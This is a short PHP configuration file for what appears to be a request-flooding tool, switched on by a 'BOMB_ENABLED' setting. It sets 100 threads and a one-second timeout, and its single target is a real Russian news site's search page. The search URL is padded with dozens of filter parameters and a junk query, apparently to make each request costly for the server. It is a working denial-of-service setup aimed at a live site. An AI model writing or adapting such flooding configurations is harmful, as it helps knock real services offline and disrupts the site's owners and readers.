<?php

return [

    'enabled' => env('BOMB_ENABLED'),

    'theards' => 100,

    'timeout' => 1,

    'destinations' => [
        ['url'=> 'https://www.kommersant.ru/search/results?search_query=ваіваів+мсчмсчмчсмч.+аорароілраол&sort_type=1&search_full=2&ru_all=on&places=1&places=6%2C34%2C52%2C61%2C62%2C198%2C242&places=86%2C284%2C286&places=57%2C258%2C259%2C260%2C261%2C262%2C263%2C285%2C295%2C296%2C303&places=2&places=84&places=14&places=5&places=3&places=217&places=210&places=66&places=17&categories=18&categories=42&categories=110&regions_all=on&regions=78&regions=25&regions=34&regions=36&regions=66&regions=18&regions=38&regions=16&regions=23&regions=24&regions=52&regions=152&regions=54&regions=55&regions=59&regions=61&regions=63&regions=64&regions=2&regions=27&regions=21&regions=74&regions=76&regions=1001&time_range=2&dateStart=2020-12-01&dateEnd=2022-03-02&stamp=637818433133942025', 'method'=> 'get'],
    ],
];